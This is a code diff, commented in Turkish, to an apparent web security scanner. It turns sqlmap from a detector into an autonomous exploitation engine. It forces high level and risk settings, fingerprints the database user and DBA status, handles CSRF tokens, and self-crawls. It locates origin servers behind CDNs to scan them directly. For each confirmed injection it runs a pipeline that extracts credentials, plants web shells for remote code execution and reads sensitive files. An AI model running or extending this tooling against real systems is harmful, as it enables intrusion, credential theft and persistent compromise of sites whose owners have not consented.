@@ -711,8 +711,31 @@ def phase_portscan(ctx: dict):
         resolved_ip = None
 
     _nmap_proxy = _cfg_top.get("_tor_proxy")
-    _logger.info(f"[Nmap] Tarama modu: {nmap_mode}, hedef: {host}")
-    res = nmap.scan(host, ports=ports_arg, mode=nmap_mode, extra_args=extra_args or None, proxy=_nmap_proxy)
+
+    # [CDN/origin] CDN/WAF arkasındaysa nmap edge'i tarar → origin'i keşfetmeye
+    # çalış; bulunursa origin'i tam güç tara, bulunamazsa port taramasını
+    # 80/443 ile sınırla (tüm port taraması CDN üzerinde anlamsızdır).
+    _scan_target = host
+    try:
+        from websecure.integrations.nmap import assess_cdn_origin
+        _do_origin = bool(nmap_cfg.get("origin_discovery", True))
+        _cdn = assess_cdn_origin(host, url=ctx.get("url") or ctx.get("target"),
+                                 do_origin_discovery=_do_origin)
+        add_result("nmap_recon", _cdn)
+        if _cdn.get("is_cdn"):
+            add_result("meta", {"stage": "portscan", "severity": "note",
+                                "message": _cdn.get("note", "")})
+            if _cdn.get("origin_ip") and _cdn.get("origin_verified"):
+                _scan_target = _cdn["origin_ip"]
+                _logger.info(f"[Nmap] CDN bypass — gerçek origin taranıyor: {_scan_target}")
+            elif _cdn.get("limit_ports") and nmap_cfg.get("cdn_limit_to_web", True):
+                ports_arg = _cdn["limit_ports"]
+                _logger.info(f"[Nmap] CDN edge — port taraması {ports_arg} ile sınırlandı")
+    except Exception as _ce:
+        _logger.debug(f"[Nmap] CDN/origin değerlendirmesi atlandı: {_ce!r}")
+
+    _logger.info(f"[Nmap] Tarama modu: {nmap_mode}, hedef: {_scan_target}")
+    res = nmap.scan(_scan_target, ports=ports_arg, mode=nmap_mode, extra_args=extra_args or None, proxy=_nmap_proxy)
 
     # Store OS guess in ctx for use by other phases
     os_guesses = list({item["os_guess"] for item in res if item.get("os_guess")})
@@ -3633,10 +3656,31 @@ def run_portscan(ctx):
     _cfg_ports = nmap_cfg.get("ports", [])
     ports_arg = ",".join(map(str, _cfg_ports)) if _cfg_ports else None
     extra_args = list(nmap_cfg.get("arguments", []) or []) or None
-    _logger.info(f"[Nmap] Başlıyor — host={host}, mod={nmap_mode} (profil={scan_profile}), ports={ports_arg or 'default'}")
+
+    # [CDN/origin] CDN/WAF arkasındaysa origin'i keşfet; bulunamazsa 80/443'e
+    # sınırla — tüm port taraması CDN edge'i üzerinde anlamsızdır.
+    _scan_target = host
+    try:
+        from websecure.integrations.nmap import assess_cdn_origin
+        _do_origin = bool(nmap_cfg.get("origin_discovery", True))
+        _cdn = assess_cdn_origin(host, url=url, do_origin_discovery=_do_origin)
+        add_result("nmap_recon", _cdn)
+        if _cdn.get("is_cdn"):
+            add_result("meta", {"stage": "portscan", "severity": "note",
+                                "message": _cdn.get("note", "")})
+            if _cdn.get("origin_ip") and _cdn.get("origin_verified"):
+                _scan_target = _cdn["origin_ip"]
+                _logger.info(f"[Nmap] CDN bypass — gerçek origin taranıyor: {_scan_target}")
+            elif _cdn.get("limit_ports") and nmap_cfg.get("cdn_limit_to_web", True):
+                ports_arg = _cdn["limit_ports"]
+                _logger.info(f"[Nmap] CDN edge — port taraması {ports_arg} ile sınırlandı")
+    except Exception as _ce:
+        _logger.debug(f"[Nmap] CDN/origin değerlendirmesi atlandı: {_ce!r}")
+
+    _logger.info(f"[Nmap] Başlıyor — host={_scan_target}, mod={nmap_mode} (profil={scan_profile}), ports={ports_arg or 'default'}")
 
     try:
-        scan_res = nmap.scan(host, mode=nmap_mode, ports=ports_arg, extra_args=extra_args, proxy=_tor_proxy)
+        scan_res = nmap.scan(_scan_target, mode=nmap_mode, ports=ports_arg, extra_args=extra_args, proxy=_tor_proxy)
     except Exception as e:
         return _mk_result("portscan", "failed", {"error": str(e)})
 
@@ -4712,9 +4756,37 @@ def _prioritize_urls(urls: List[str]) -> List[str]:
 
 
 
+def _detect_csrf_token_name(results: dict) -> str | None:
+    """
+    Keşfedilen formlardan CSRF token alan adını çıkar.
+
+    sqlmap'e --csrf-token=<ad> verebilmek için kullanılır; aksi halde token
+    korumalı formlarda her istek reddedilir ve sessiz false-negative oluşur.
+    """
+    if not isinstance(results, dict):
+        return None
+    _pat = re.compile(r"csrf|xsrf|_token|authenticity_token|nonce|verif", re.I)
+    pages = results.get("forms_meta") or []
+    for page in pages:
+        if not isinstance(page, dict):
+            continue
+        for form in (page.get("forms") or []):
+            if not isinstance(form, dict):
+                continue
+            for inp in (form.get("inputs") or form.get("fields") or []):
+                name = inp.get("name") if isinstance(inp, dict) else None
+                if name and _pat.search(str(name)):
+                    return str(name)
+    return None
+
+
 def run_sqlmap_scan(ctx) -> None:
     """
-    Runs SQLMap against the target using the integration wrapper.
+    sqlmap'i bağımsız bir SQLi keşif + sömürü motoru olarak çalıştırır.
+
+    Artık "doğrulayıcı" değil: kendi crawl'ını yapabilir, tüm parametreleri
+    yüksek level/risk ile dener, CSRF token'ı yönetir ve onaylanan injection'ları
+    SQLiExploiter ile sömürür (şema/kimlik bilgisi/dosya/RCE).
     [Check 1, 2, 5] Tools working, Payload/Exploit, Proxy support.
     """
     if SQLMapWrapper is None:
@@ -4735,9 +4807,11 @@ def run_sqlmap_scan(ctx) -> None:
         add_result("meta", {"stage": "sqlmap", "status": "skipped", "reason": "Binary not found in PATH"})
         return
 
-    # [Check 2] Payloads/Exploit levels
-    level = int(_get_config(ctx, "sqlmap.level", 1))
-    risk = int(_get_config(ctx, "sqlmap.risk", 1))
+    # [beast] Saldırı gücü: floor yüksek tutulur — sqlmap artık doğrulayıcı
+    # değil, bağımsız bir keşif+sömürü motoru. level 5 = cookie/header/referer
+    # injection da denenir; risk 3 = OR-based + zaman tabanlı ağır testler.
+    level = max(3, int(_get_config(ctx, "sqlmap.level", 5)))
+    risk = max(2, int(_get_config(ctx, "sqlmap.risk", 3)))
 
     # [Check 5] Proxy
     extra_args = list(_get_config(ctx, "sqlmap.extra_args", []) or [])
@@ -4747,6 +4821,20 @@ def run_sqlmap_scan(ctx) -> None:
 
     if _get_config(ctx, "sqlmap.random_agent", True):
         extra_args.append("--random-agent")
+
+    # [beast] Ucuz DBMS parmak izi — yalnızca zafiyetli parametrelerde çalışır,
+    # genel yük getirmez ama bulgulara DBMS/banner/kullanıcı bağlamı ekler.
+    if _get_config(ctx, "sqlmap.fingerprint", True):
+        for _fp in ("--banner", "--current-user", "--current-db", "--hostname", "--is-dba"):
+            if _fp not in extra_args:
+                extra_args.append(_fp)
+
+    # [beast] CSRF korumalı formlarda token'ı otomatik yönet — aksi halde
+    # sqlmap her istekte reddedilir → sessiz false-negative.
+    _csrf_token = _detect_csrf_token_name(getattr(ctx, "results", {}))
+    if _csrf_token and not any(str(a).startswith("--csrf-token") for a in extra_args):
+        extra_args.append(f"--csrf-token={_csrf_token}")
+        _logger.info(f"[SQLMap] CSRF token parametresi yönetiliyor: {_csrf_token}")
 
 
     # [Smart] Tech-aware extension hints from detected technologies
@@ -4799,38 +4887,61 @@ def run_sqlmap_scan(ctx) -> None:
 
     # Tek hedef varsa -u, birden fazlaysa -m ile URL listesi dosyası geç
     import tempfile as _tmpfile, os as _os
-    cmd_args = list(extra_args)
-    if param_str:
-        cmd_args.extend(["-p", param_str])
 
-    if len(_all_eps) == 1:
-        _logger.info("[SQLMap] Tek endpoint — sqlmap bir kez çalışıyor: %s", _all_eps[0])
+    # [beast] Parametreli yüzey azsa sqlmap KENDİ crawl'ını yapsın — böylece
+    # bizim crawler'ın kaçırdığı endpoint'leri de keşfeder. Discovery aracı
+    # olarak bağımsız çalışmasının anahtarı budur.
+    _crawl_depth = int(_get_config(ctx, "sqlmap.crawl_depth", 3))
+    _self_discover = len(_param_eps) < 3 and _crawl_depth > 0
+
+    if _self_discover:
+        # Self-crawl modunda -p verme: sqlmap kendi bulduğu tüm parametreleri test etsin
+        cmd_args = list(extra_args)
+        if not any(str(a).startswith("--crawl") for a in cmd_args):
+            cmd_args.extend(["--crawl", str(_crawl_depth)])
+        if "--forms" not in cmd_args:
+            cmd_args.append("--forms")
+        _logger.info(
+            "[SQLMap] Az parametreli yüzey (%d) — sqlmap self-crawl (depth=%d) ile bağımsız keşif yapıyor",
+            len(_param_eps), _crawl_depth,
+        )
         findings = wrapper.scan(
-            _all_eps[0], batch=True, level=level, risk=risk,
+            url, batch=True, level=level, risk=risk,
             extra_args=cmd_args, proxy=proxy, profile_cfg=_sqlmap_profile,
         )
     else:
-        # -m: sqlmap URL listesi dosyasından okur, tek process içinde iter eder
-        _url_fd, _url_file = _tmpfile.mkstemp(suffix=".txt", prefix="ws_sqlmap_urls_")
-        try:
-            with _os.fdopen(_url_fd, "w") as _fh:
-                _fh.write("\n".join(_all_eps))
-            _logger.info(
-                "[SQLMap] %d endpoint — tek sqlmap çalışması (-m): %s",
-                len(_all_eps), _url_file,
-            )
-            # -m flag'ini extra_args olarak geçir; wrapper.scan() birincil URL'yi
-            # sadece raporlama için kullanır, asıl hedefler dosyadan okunur
-            _m_args = cmd_args + ["-m", _url_file]
+        cmd_args = list(extra_args)
+        if param_str:
+            cmd_args.extend(["-p", param_str])
+
+        if len(_all_eps) == 1:
+            _logger.info("[SQLMap] Tek endpoint — sqlmap bir kez çalışıyor: %s", _all_eps[0])
             findings = wrapper.scan(
                 _all_eps[0], batch=True, level=level, risk=risk,
-                extra_args=_m_args, proxy=proxy, profile_cfg=_sqlmap_profile,
+                extra_args=cmd_args, proxy=proxy, profile_cfg=_sqlmap_profile,
             )
-        finally:
+        else:
+            # -m: sqlmap URL listesi dosyasından okur, tek process içinde iter eder
+            _url_fd, _url_file = _tmpfile.mkstemp(suffix=".txt", prefix="ws_sqlmap_urls_")
             try:
-                _os.unlink(_url_file)
-            except Exception:
-                pass
+                with _os.fdopen(_url_fd, "w") as _fh:
+                    _fh.write("\n".join(_all_eps))
+                _logger.info(
+                    "[SQLMap] %d endpoint — tek sqlmap çalışması (-m): %s",
+                    len(_all_eps), _url_file,
+                )
+                # -m flag'ini extra_args olarak geçir; wrapper.scan() birincil URL'yi
+                # sadece raporlama için kullanır, asıl hedefler dosyadan okunur
+                _m_args = cmd_args + ["-m", _url_file]
+                findings = wrapper.scan(
+                    _all_eps[0], batch=True, level=level, risk=risk,
+                    extra_args=_m_args, proxy=proxy, profile_cfg=_sqlmap_profile,
+                )
+            finally:
+                try:
+                    _os.unlink(_url_file)
+                except Exception:
+                    pass
 
     # Report
     if findings:
@@ -4853,6 +4964,74 @@ def run_sqlmap_scan(ctx) -> None:
                 add_result("offensive", entry)
     else:
         add_result("sqlmap", {"status": "finished", "findings": 0})
+
+    # [beast] Onaylanan her injection için tam sömürü hattı — şema dökümü,
+    # kimlik bilgisi çıkarımı, dosya okuma/yazma, RCE. sqlmap artık yalnızca
+    # tespit değil sömürü de yapan bir motor.
+    if findings and _get_config(ctx, "exploitation.enabled", True):
+        try:
+            from websecure.scanners.sqli import SQLiExploiter as _SQLiExploiter
+        except Exception as _ie:
+            _logger.debug(f"[SQLMap] SQLiExploiter import edilemedi: {_ie!r}")
+            _SQLiExploiter = None
+        if _SQLiExploiter is not None:
+            _seen_pp: set = set()
+            for f in findings:
+                if not isinstance(f, dict):
+                    continue
+                _u = f.get("url") or url
+                _pm = f.get("parameter") or f.get("param")
+                if not _pm:
+                    continue
+                _key = (_u, _pm)
+                if _key in _seen_pp:
+                    continue
+                _seen_pp.add(_key)
+                _db_hint = "mysql"
+                _ev = f.get("evidence") if isinstance(f.get("evidence"), dict) else {}
+                if _ev.get("dbms"):
+                    _db_hint = str(_ev["dbms"]).split()[0].lower()
+                try:
+                    _exp = _SQLiExploiter(session=getattr(ctx, "session", None))
+                    _rep = _exp.full_exploitation_pipeline(_u, _pm, db_hint=_db_hint)
+                except Exception as _ee:
+                    _logger.debug(f"[SQLMap] sömürü başarısız {_u} ({_pm}): {_ee!r}")
+                    continue
+                if _rep.get("credentials"):
+                    add_result("offensive", {
+                        "severity": "critical",
+                        "type": "SQL Injection — Credentials Extracted",
+                        "tool": "sqlmap",
+                        "url": _u, "parameter": _pm,
+                        "evidence": {
+                            "credentials": _rep["credentials"][:5],
+                            "count": len(_rep["credentials"]),
+                        },
+                        "verified": True,
+                    })
+                    _logger.warning(
+                        "[SQLMap] %d kimlik bilgisi çıkarıldı: %s (%s)",
+                        len(_rep["credentials"]), _u, _pm,
+                    )
+                if _rep.get("web_shell"):
+                    add_result("offensive", {
+                        "severity": "critical",
+                        "type": "SQL Injection → Web Shell (RCE)",
+                        "tool": "sqlmap",
+                        "url": _u, "parameter": _pm,
+                        "evidence": {"web_shell": _rep["web_shell"]},
+                        "verified": True,
+                    })
+                    _logger.warning("[SQLMap] Web shell yerleştirildi: %s", _rep["web_shell"])
+                if _rep.get("file_reads"):
+                    add_result("offensive", {
+                        "severity": "high",
+                        "type": "SQL Injection — Sensitive File Read",
+                        "tool": "sqlmap",
+                        "url": _u, "parameter": _pm,
+                        "evidence": {"files": list(_rep["file_reads"].keys())[:10]},
+                        "verified": True,
+                    })
 
     # [WS3] Python-based SQLi (Robust Fallback/Companion)
     if run_local_sqli:
